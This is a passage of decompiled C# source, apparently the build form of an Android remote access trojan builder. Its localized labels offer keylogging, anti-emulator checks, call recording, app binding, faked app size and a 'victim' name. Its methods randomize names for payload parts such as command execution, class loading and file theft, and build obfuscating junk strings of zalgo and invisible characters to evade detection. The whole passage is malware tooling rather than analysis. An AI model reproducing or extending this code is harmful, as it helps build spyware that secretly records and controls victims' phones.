				this.TABCTRL.TabPages[2].Text = "معلومات";
				this.TABCTRL.TabPages[3].Text = "أدواة";
				this.TABCTRL.TabPages[4].Text = "الواجهة";
				this.TABCTRL.TabPages[5].Text = "الصلاحيات";
				this.TABCTRL.TabPages[6].Text = "بناء";
				this.Label34.Text = "تثبيت سريع";
				this.Label36.Text = "الظهور فوق التطبيقات";
			}
			else if (Operators.CompareString(left, "CN", false) == 0)
			{
				this.MainText.Text = "IP地址";
				this.Label1.Text = "连接端口";
				this.Label20.Text = "安装后";
				this.Label22.Text = "应用名称";
				this.Label23.Text = "网站链接";
				this.Button1.Text = "应用程序图标";
				this.keeplivelabel.Text = "保持连接";
				this.sizelabel.Text = "应用大小";
				this.Label27.Text = "定制应用";
				this.CheckFakeSize.Text = "应用程序大小";
				this.Label28.Text = "自定义通知";
				this.Label24.Text = "通知标题";
				this.Label25.Text = "通知消息";
				this.Label25.Text = "保持连接活跃";
				this.Label2.Text = "用户名";
				this.Label3.Text = "应用名称";
				this.Label9.Text = "应用版本";
				this.Label4.Text = "应用编号";
				this.Label11.Text = "应用程序图标";
				this.Label15.Text = "键盘记录器";
				this.Label18.Text = "反模拟器";
				this.Label13.Text = "超级模式";
				this.AutoRec.Text = "通话录音";
				this.Label10.Text = "绑定";
				this.Label26.Text = "绑定的应用ID";
				this.Label19.Text = "应用版本";
				this.Label29.Text = "标题";
				this.Label31.Text = "欢迎留言";
				this.Label32.Text = "接受按钮";
				this.Button3.Text = "默认选项";
				this.SelectedApk.Text = "开始构建";
				this.TABCTRL.TabPages[0].Text = "连接";
				this.TABCTRL.TabPages[1].Text = "选项";
				this.TABCTRL.TabPages[2].Text = "信息";
				this.TABCTRL.TabPages[3].Text = "工具";
				this.TABCTRL.TabPages[4].Text = "界面";
				this.TABCTRL.TabPages[5].Text = "权限";
				this.TABCTRL.TabPages[6].Text = "建造";
				this.Label34.Text = "快速安装";
				this.Label36.Text = "绘制在其他应用程序上";
			}
		}

		// Token: 0x060009B2 RID: 2482 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060009B3 RID: 2483 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_2()
		{
		}

		// Token: 0x060009B4 RID: 2484 RVA: 0x000672F8 File Offset: 0x000654F8
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x060009B5 RID: 2485 RVA: 0x00067340 File Offset: 0x00065540
		private void Build_Load(object sender, EventArgs e)
		{
			try
			{
				base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\4.ico");
				this.method_0();
			}
			catch (Exception)
			{
			}
			this.Nottitle.Text = MySettingsProperty.Settings.NotifiTitle;
			this.Notmsg.Text = MySettingsProperty.Settings.NotifiText;
			this.logbodytext.Text = MySettingsProperty.Settings.bodytext;
			this.dscriptext.Text = MySettingsProperty.Settings.accessdiscribe;
			checked
			{
				try
				{
					int num = 1;
					do
					{
						this.randomverbtn_Click(null, null);
						this.randomidbtn_Click(null, null);
						num++;
					}
					while (num <= 3);
				}
				catch (Exception)
				{
				}
				Thread thread = new Thread((Build.Class12.threadStart_0 != null) ? Build.Class12.threadStart_0 : (Build.Class12.threadStart_0 = new ThreadStart(Build.Class12.class12_0.method_0)));
				thread.IsBackground = true;
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				try
				{
					this.bool_3 = true;
				}
				catch (Exception)
				{
				}
				try
				{
					this.TextNameVictim.Text = MySettingsProperty.Settings.build_text_name_victim;
					this.TextNamePatch.Text = MySettingsProperty.Settings.build_text_name_patch;
					this.TextVersion.Text = MySettingsProperty.Settings.build_text_version;
				}
				catch (Exception)
				{
				}
				try
				{
					this.po.Value = new decimal(MySettingsProperty.Settings.build_text_port);
					this.CheckHide.Checked = true;
					this.CheckDoze.Checked = MySettingsProperty.Settings.build_Checked_doze;
					this.CheckIconPatch.Checked = MySettingsProperty.Settings.build_Checked_icon;
					this.string_8 = MySettingsProperty.Settings.build_path_icon;
				}
				catch (Exception)
				{
				}
				try
				{
					if (this.string_8.Length > 0)
					{
						try
						{
							this.PictureBox1.Image = Image.FromFile(this.string_8);
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					this.string_1 = MySettingsProperty.Settings.BIND_Path;
					this.string_2 = MySettingsProperty.Settings.BIND_EX;
					this.string_7 = MySettingsProperty.Settings.intent;
				}
				catch (Exception)
				{
				}
				try
				{
					if (!File.Exists(this.string_1))
					{
						this.string_1 = "null";
						this.string_2 = "null";
						this.CheckBIND.Checked = false;
					}
					else
					{
						this.CheckBIND.Checked = true;
					}
				}
				catch (Exception)
				{
				}
				try
				{
					if (!File.Exists(this.string_8) && Operators.CompareString(this.string_8, "null", false) != 0)
					{
						this.string_8 = "null";
						this.CheckIconPatch.Checked = false;
					}
				}
				catch (Exception)
				{
				}
				try
				{
					string build_DGV_list = MySettingsProperty.Settings.build_DGV_list;
					if (Operators.CompareString(build_DGV_list, "null", false) != 0)
					{
						foreach (string text in build_DGV_list.Split(new string[]
						{
							this.string_22
						}, StringSplitOptions.None))
						{
							if (text.Length > 0 && text.Contains(":"))
							{
								this.DGV0.Rows.Add(new object[]
								{
									text
								});
							}
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					this.TextIP.Text = Module2.smethod_53();
					this.bool_3 = false;
					this.TOpacity.Interval = Module5.int_0;
					this.TOpacity.Enabled = true;
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060009B6 RID: 2486 RVA: 0x0000246D File Offset: 0x0000066D
		private void TiMAT_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x060009B7 RID: 2487 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_6(object sender, EventArgs e)
		{
		}

		// Token: 0x060009B8 RID: 2488 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_7(object sender, EventArgs e)
		{
		}

		// Token: 0x060009B9 RID: 2489 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_8(object sender, EventArgs e)
		{
		}

		// Token: 0x060009BA RID: 2490 RVA: 0x00067714 File Offset: 0x00065914
		private void method_9()
		{
			this.noti8 = this.method_16(5, 25).ToString().ToLower();
		}

		// Token: 0x060009BB RID: 2491 RVA: 0x0006773C File Offset: 0x0006593C
		private void method_10()
		{
			this.web0 = this.method_16(5, 25).ToString().ToLower();
		}

		// Token: 0x060009BC RID: 2492 RVA: 0x00067764 File Offset: 0x00065964
		private void method_11()
		{
			this.ico0 = this.method_16(5, 25).ToString().ToLower();
			this.ico1 = this.method_16(5, 25).ToString().ToLower();
		}

		// Token: 0x060009BD RID: 2493 RVA: 0x000677A4 File Offset: 0x000659A4
		private void method_12()
		{
			this.app0 = Conversions.ToString(this.method_16(5, 25));
		}

		// Token: 0x060009BE RID: 2494 RVA: 0x000677C8 File Offset: 0x000659C8
		private void method_13()
		{
			this.string_47 = Conversions.ToString(this.method_16(10, 25));
			this.string_48 = Conversions.ToString(this.method_16(10, 25));
			this.string_49 = Conversions.ToString(this.method_16(10, 25));
			this.string_50 = Conversions.ToString(this.method_16(10, 25));
			this.string_51 = Conversions.ToString(this.method_16(10, 25));
			this.string_52 = Conversions.ToString(this.method_16(10, 25));
			this.str6 = Conversions.ToString(this.method_16(10, 25));
			this.str7 = Conversions.ToString(this.method_16(10, 25));
			this.str8 = Conversions.ToString(this.method_16(10, 25));
			this.str9 = Conversions.ToString(this.method_16(10, 25));
			this.str10 = Conversions.ToString(this.method_16(10, 25));
			this.str11 = Conversions.ToString(this.method_16(10, 25));
			this.str12 = Conversions.ToString(this.method_16(10, 25));
		}

		// Token: 0x060009BF RID: 2495 RVA: 0x000678E8 File Offset: 0x00065AE8
		private void method_14()
		{
			this.method_30("Please Wait...");
			this.QQ0 = Conversions.ToString(this.method_19(50, 80));
			this.QQ1 = Conversions.ToString(this.method_19(50, 80));
			this.QQ2 = Conversions.ToString(this.method_19(50, 80));
			this.QQ3 = Conversions.ToString(this.method_19(50, 80));
			this.QQ4 = Conversions.ToString(this.method_19(50, 80));
			this.QQ5 = Conversions.ToString(this.method_19(50, 80));
			this.QQ6 = Conversions.ToString(this.method_19(50, 80));
			this.QQ8 = Conversions.ToString(this.method_19(50, 80));
			this.QQ9 = Conversions.ToString(this.method_19(50, 80));
			this.QQ10 = Conversions.ToString(this.method_19(50, 80));
			this.QQ11 = Conversions.ToString(this.method_19(50, 80));
			this.QQ12 = Conversions.ToString(this.method_19(50, 80));
			this.QQ13 = Conversions.ToString(this.method_19(50, 80));
			this.QQ14 = Conversions.ToString(this.method_19(50, 80));
			this._access_ask_ = Conversions.ToString(this.method_19(50, 80));
			this._ask_battary_ = Conversions.ToString(this.method_19(50, 80));
			this._ask_draw_ = Conversions.ToString(this.method_19(50, 80));
			this._sc_fb_ = Conversions.ToString(this.method_19(50, 80));
			this._news_g_ = Conversions.ToString(this.method_19(50, 80));
			this._strt_view_ = Conversions.ToString(this.method_19(50, 80));
			this._scctrl_ = Conversions.ToString(this.method_19(50, 80));
			this._cap_sc_ = Conversions.ToString(this.method_19(50, 80));
			this._trns_g_ = Conversions.ToString(this.method_19(50, 80));
			this._ask_prim_ = Conversions.ToString(this.method_19(50, 80));
			this._engine_wrk_ = Conversions.ToString(this.method_19(50, 80));
			this._skin_cls_ = Conversions.ToString(this.method_19(50, 80));
			this._update_app_ = Conversions.ToString(this.method_19(50, 80));
			this._callr_lsnr_ = Conversions.ToString(this.method_19(50, 80));
			this._clss_loder_ = Conversions.ToString(this.method_19(50, 80));
			this._excut_meth_ = Conversions.ToString(this.method_19(50, 80));
			this._run_comnd_ = Conversions.ToString(this.method_19(50, 80));
			this._get_me_fil_ = Conversions.ToString(this.method_19(50, 80));
			this._srv_worker_ = Conversions.ToString(this.method_19(50, 80));
			this.payload = Conversions.ToString(this.method_16(50, 80));
			this.string_53 = Conversions.ToString(this.method_19(50, 80));
			this.string_54 = Conversions.ToString(this.method_19(50, 80));
			this.string_55 = Conversions.ToString(this.method_19(50, 80));
			this.string_56 = Conversions.ToString(this.method_19(50, 80));
			this.string_57 = Conversions.ToString(this.method_19(50, 80));
			this.string_58 = Conversions.ToString(this.method_19(50, 80));
			this.string_59 = Conversions.ToString(this.method_19(50, 80));
			this.string_60 = Conversions.ToString(this.method_19(50, 80));
			this.string_61 = Conversions.ToString(this.method_19(50, 80));
			this.string_62 = Conversions.ToString(this.method_19(50, 80));
			this.string_63 = Conversions.ToString(this.method_19(50, 80));
			this.string_64 = Conversions.ToString(this.method_19(50, 80));
			this.string_65 = Conversions.ToString(this.method_19(50, 80));
			this.string_66 = Conversions.ToString(this.method_19(50, 80));
			this.string_67 = Conversions.ToString(this.method_19(50, 80));
			this.string_68 = this.method_15();
		}

		// Token: 0x060009C0 RID: 2496 RVA: 0x00067D14 File Offset: 0x00065F14
		public string method_15()
		{
			return Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(this.method_17(400, 1000), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_19(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_17(400, 1000)), "\u0085\u0085\\n\u0085\u0085\u0085\u0085\u0085\\n\u0085\u0085\u0085"), this.method_18(400, 1000)));
		}

		// Token: 0x060009C1 RID: 2497 RVA: 0x00067D98 File Offset: 0x00065F98
		public object method_16(int int_4, int int_5)
		{
			string text = "qazwsxedcrfvtgbyhnjmikolp";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_4)
				{
					text2 = text2 + this.strings_0[this.random_1.Next(0, this.strings_0.Length)] + Conversions.ToString(text[this.random_1.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_2;
				this.int_2 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_2);
			}
		}

		// Token: 0x060009C2 RID: 2498 RVA: 0x00067E44 File Offset: 0x00066044
		public object method_17(int int_4, int int_5)
		{
			string text = "qazwsxedcrfvtgbyhnjmikolp";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_4)
				{
					text2 = text2 + this.strings_0[this.random_1.Next(0, this.strings_0.Length)] + Conversions.ToString(text[this.random_1.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_2;
				this.int_2 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_2);
			}
		}

		// Token: 0x060009C3 RID: 2499 RVA: 0x00067EF0 File Offset: 0x000660F0
		public object method_18(int int_4, int int_5)
		{
			string text = "ሙዚቃይመልከቱት̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝ቅንብርይመልከቱት̸̢͊͐.̵̷̧͖̩͍̜̩͙̿̓̀̄̄͑̚͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝ይመልከቱትበጣም̵̧̠̼͍̦̀̀̋́̋̃̅̏͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̵̢̧̖̖̤̲̦̜̥͉̙̬̗͌̆̈́̓͋̇̑̌̿̕͝ͅs̵̛̖̒͒̄͋̅̆o̶̡̧̕ű̴͖̬̅̏͐̄̈́̏̌̑͐r̶̭͈̗͛ۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤ۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤̵̲̦̜̥͉̙̬̗̿ͅs̵̛̖̒͒̄͋̅̆o̶̡̧̕ű̴͖̬̅̏͐̄̈́̏̌̑͐r̶̭͈̗͛ۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤ۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤ሙዚቃ̴̢̮̠̭̘̳̦͍́̈́͂̎̽̊̔̉D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠ሙዚቃየሚልሙዚቃበጣምቅንብር̴̢̮̠̭̘̳̦͍́̈́͂̎̽̊̔̉D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠ደስ̸̢ۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡ͊͐.̵͖̿̓̀̄̄̚ደስየሚልየሚልۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡቅንብርሙዚቃሙዚቃ̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝በጣምዋውቅንብርበጣምይመልከቱት̶ۣ͕۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡ̆f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ĕ̷̳̟͚͈͓̬̙͎͖̣̎͌ሙዚቃደስየሚል̵̲̦̜̥͉̙̬̗̿ͅs̵̛̖̒͒̄͋̅̆o̶̡̧̕ű̴͖̬̅̏͐̄̈́̏̌̑͐r̶̭͈̗͛ۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤ۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤̶͕̆f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ĕ̷̵̳̟͚͈͓̬̙͎͖̣̲̦̜̥͉̙̬̗̎͌̿ͅs̵̛̖̒͒̄͋̅̆o̶̡̧̕ű̴͖̬̅̏͐̄̈́̏̌̑͐r̶̭͈̗͛ۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤ۣ۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡۥۣۧۨۤ۟ۤۤۢ⁣⁣⁣⁣⁣⁠⁤⁤⁠⁤⁠⁤⁠⁤⁠⁣⁣⁣⁣⁣⁠⁣⁤⁠⁠⁠⁣⁣⁣⁣⁣⁤⁣⁣⁣⁣⁣⁠⁣⁣⁣⁣⁤⁤⁠⁤⁣⁠⁤⁤̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̶̯̤̼͕̆͝f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ĕ̷̳̟͚͈͓̬̙͎͖̣̎͌ይመልከቱትቅንብር̴̢̮̠̭̘̳̦͍́̈́͂̎̽̊̔̉D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠በጣም̸̢͊͐.̵̵̧͖ۣ̠̼͍̦̿̓̀̄̄۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡ̀̀̋́̋̃̅̏̚͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̢̧̖̖̤͌̆̈́̓͋̇̑̌̕͝ደስ̶͕̆f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ḝ̷̵̳̟͚͈͓̬̙͎͖̣̠̼͍̦̎͌̀̀̋́̋̃̅̏͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̶̢̧̖̖̤͕͌̆̈́̓͋̇̑̌̆̕͝f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ḝ̷̷̳̟͚͈͓̬̙͎͖̣̩͍̜̩͙̎͌͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅņ̶̵̯̤̼̠̼͍̦̃̀̀̋́̋̃̅̏͘͝ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̢̧̖̖̤͌̆̈́̓͋̇̑̌̕͝ሙዚቃ̴̢̮̠̭̘̳̦͍́̈́͂̎̽̊̔̉D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠ይመልከቱት̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅņ̶̵̯̤̼̠̼͍̦̃̀̀̋́̋̃̅̏͘͝ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̢̧̖̖̤͌̆̈́̓͋̇̑̌̕͝ይወዱታል̴̵̧͖̠̼͍̦̀̋̀̀̋́̋̃̅̏͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̴̢̧̢̖̖̤̮̠̭̘̳̦͍͌̆̈́̓͋̇̑̌́̈́͂̎̽̊̔̉̕͝D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠ደስ̸̷̧ۣ̦̺̪̙̱̹̩͍̜̩͙۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡ͋̈́̑̓͑̕͝ͅo̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̶̯̤̼͕̆͝f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ĕ̷̳̟͚͈͓̬̙͎͖̣̎͌የሚልሙዚቃ̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̸̸̢̯̤̼̦̺̪̙̱̹͋̈́̑̓͊͐̕͝ͅ.̵͖̿̓̀̄̄̚በጣምበጣም̵̧̠̼͍̦̀̀̋́̋̃̅̏͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̵̢̧̧̖̖̤̠̼͍̦͌̆̈́̓͋̇̑̌̀̀̋́̋̃̅̏̕͘͝ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̢̧̖̖̤͌̆̈́̓͋̇̑̌̕͝ዋው̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅņ̶̸̷̯̤̼̦̺̪̙̱̹̩͍̜̩͙̃͋̈́̑̓͑̕͝͝ͅo̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝በጣምይወዱታል̴͖̀̋ቅንብርይወዱታል̴̴̢͖̮̠̭̘̳̦͍̀̋́̈́͂̎̽̊̔̉D̵̡̨̨̨̜̤͈̺́̋̈́̈̄̆̚o̶̡̡̞͉̯͓̟̝̥͗̾̑ń̷̢̜͎̯̘̻̃̍e̵̢̧̢̛͔̦͉͎̤͔͊̾̒̈́̀͠የሚልይመልከቱት̷̧̩͍̜̩͙͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝ይመልከቱት̶͕̆f̷̠͓̣̹̠̒r̶͇̤͌̏̀͂ē̸̡̳̗͎͓̊ḝ̷̷̳̟͚͈͓̬̙͎͖̣̩͍̜̩͙̎͌͑͝o̸̙̲̝̥̊̆̈́̎͝ͅp̷̧̛̰̼̙̘̩̾̑͊́̑̎͘ͅe̶̺̳̜͔̅̿̍̈́͋͝͝ͅñ̶̯̤̼͝ዋው̵̧̠̼͍̦̀̀̋́̋̃̅̏͘ỉ̵̬͚͉̮̘͚̉̈̔̃s̵̸̢̧̛̖̖̤ۣ͚͓̘̠͎͌̆̈́̓͋̇̑̌۟۠ۡ۠ۨۢ۠ۢۧۧ۟ۢۤۨۡ͑͛̔́͆̀̄́̕̕͝Ṭ̶͊͆̌̔̔̓̊̆̐͠h̸̼͍̉͒̀́̈́̔͛́̕͝í̴̛̹̮̾̾͘s̴͎̙̥͙̣̈́̌";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_4)
				{
					text2 += Conversions.ToString(text[this.random_1.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_2;
				this.int_2 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_2);
			}
		}

		// Token: 0x060009C4 RID: 2500 RVA: 0x00067F80 File Offset: 0x00066180
		public object method_19(int int_4, int int_5)
		{
			string text = "qazQAZwsxWSXedcEDCrfvRFVtgbTGByhnYHNujmUJMikIKolOLpP";
			if (this.random_0 == null)
			{
				this.random_0 = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < int_4)
				{
					text2 += Conversions.ToString(text[this.random_1.Next(0, text.Length - 1)]);
				}
				ref int ptr = ref this.int_2;
				this.int_2 = ptr + 1;
				return text2.ToString().ToLower() + Conversions.ToString(this.int_2);
			}
		}

		// Token: 0x060009C5 RID: 2501 RVA: 0x00068010 File Offset: 0x00066210
		private string method_20(string string_0)
		{
			string text = "&";
			string text2 = "&amp;";
			string text3 = "<";
			string text4 = "&lt;";
			string text5 = "\"";
			string text6 = "\\\"";
			string text7 = "'";
			string text8 = "\\'";
			string text9 = "?";
			string text10 = "\\?";
			string text11 = "@";
			string text12 = "\\@";
			if (string_0.Contains(text) && !string_0.Contains(text2))
			{
				string_0 = string_0.Replace(text, text2);
			}
			if (string_0.Contains(text3) && !string_0.Contains(text4))
			{
				string_0 = string_0.Replace(text3, text4);
			}
			if (string_0.Contains(text5) && !string_0.Contains(text6))
			{
				string_0 = string_0.Replace(text5, text6);
			}
			if (string_0.Contains(text7) && !string_0.Contains(text8))
			{
				string_0 = string_0.Replace(text7, text8);
			}
			if (string_0.Contains(text9) && !string_0.Contains(text10))
			{
				string_0 = string_0.Replace(text9, text10);
			}
			if (string_0.Contains(text11) && !string_0.Contains(text12))
			{
				string_0 = string_0.Replace(text11, text12);
			}
			return string_0;
		}

		// Token: 0x060009C6 RID: 2502 RVA: 0x00068140 File Offset: 0x00066340
		private void method_21(string string_0)
		{
			this.method_37(true);
			if (Operators.CompareString(string_0, null, false) != 0)
			{
				this.int_2 = 1;
				string[] array = string_0.Split(new string[]
				{
					this.string_0
				}, StringSplitOptions.None);
				this.string_35 = array[0];
				this.string_36 = array[1];
				this.string_37 = this.method_20(array[2]);
				this.string_38 = this.method_20(array[3]);
				this.string_39 = array[4];
				string[] array2 = array[5].Split(new char[]
				{
					':'
				});
				this.string_40 = array2[0];
				this.string_69 = array2[1];
				this.string_41 = array[6];
				this.object_0 = array[7];
				this.string_45 = array[8];
				this.object_1 = array[10];
				this.string_42 = array[11];
				string[] array3 = array[12].Split(new char[]
				{
					'|'
				});
				array3[0].Split(new char[]
				{
					','
				});
				array3[1].Split(new char[]
				{
					','
				});
				this.string_8 = array[13];
				if (File.Exists(this.string_8))
				{
					this.bitmap_0 = (Bitmap)Module2.smethod_38(new Bitmap(this.string_8), new Size(144, 144), false);
				}
				this.string_1 = array[16];
				this.string_2 = array[17];
				this.string_7 = this.method_20(array[18]);
				this.string_46 = array[19];
				if (this.string_46.Contains("."))
				{
					string[] array4 = this.string_46.Split(new char[]
					{
						'.'
					});
					this.package = array4[0];
					this.name = array4[1];
					this.activz = Conversions.ToString(this.method_19(50, 60));
					this.servziz = Conversions.ToString(this.method_19(50, 60));
					this.tolziz = Conversions.ToString(this.method_19(50, 60));
					this.brodatz = Conversions.ToString(this.method_19(50, 60));
				}
				this.method_14();
				this.method_13();
				this.method_12();
				this.method_11();
				this.method_10();
				this.method_9();
				string left = array[14];
				if (Operators.CompareString(left, "Bold", false) == 0 || Operators.CompareString(left, "Regular", false) == 0)
				{
				}
				Conversions.ToInteger(array[15]);
				this.method_30("Starting...\r\n----------");
				new Thread(new ThreadStart(this.method_22))
				{
					IsBackground = true
				}.Start();
			}
		}

		// Token: 0x060009C7 RID: 2503 RVA: 0x000683D4 File Offset: 0x000665D4
		public static void smethod_1(string string_70)
		{
			string[] files = Directory.GetFiles(string_70);
			string[] directories = Directory.GetDirectories(string_70);
			foreach (string path in files)
			{
